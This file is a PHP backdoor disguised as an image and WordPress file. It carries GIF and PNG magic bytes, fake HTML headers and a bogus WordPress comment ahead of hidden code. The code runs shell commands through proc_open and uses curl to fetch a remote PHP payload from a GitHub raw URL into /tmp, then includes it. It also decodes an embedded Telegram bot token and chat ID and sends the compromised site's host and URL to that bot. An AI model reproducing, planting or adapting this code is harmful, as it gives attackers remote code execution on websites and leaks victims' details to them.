GIF89a
.
.
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<title>php</title>
* Front to the WordPress application. This file doesn't do anything, but loads</html>
PNG %﻿PNG %﻿PNG %﻿PNG %
/* Ã¥ÂÂÃ¨ÂÂÃ¦ÂÂÃ§Â¤Âº:/
<?=
error_reporting(E_ALL);
ini_set('display_errors', 1);

function ex($coman, $serlok)
{
	$ler = "2>&1";
	if (!preg_match("/" . $ler . "/i", $coman)) {
		$coman = $coman . " " . $ler;
	}
	$pr = "proc_open";
	if (function_exists($pr)) {
		$tod = @$pr($coman, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
		echo htmlspecialchars(stream_get_contents($crottz[1]));
	} else {
		return false;
	}
}

$fname = "sess_" . md5("rex") . ".php";
if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
    ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.fax.php", "/tmp");
}
       $tk = base64_decode(
            "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
        );
        $cid = base64_decode("NTA3MDkzODc3OA");

        function reportTelegram($msg) {
            global $tk,
            $cid;
            $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
            if (!file_exists($id)) {
                @file_get_contents(
                    "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                    urlencode($msg)
                );
                @file_put_contents($id, time());
            }
        }
        /* ================= Report ================= */
        if (!isset($_SESSION["telegram_reported"])) {
            $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
            $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
            if (is_file($path)) {
                $host = $_SERVER["HTTP_HOST"];
                $url =
                (isset($_SERVER["HTTPS"]) ? "https" : "http") .
                "://" .
                $host .
                $uri;
                reportTelegram("m:\n$host\n$url");
                $_SESSION["telegram_reported"] = true;
            }
        }
include("/tmp/$fname");

?>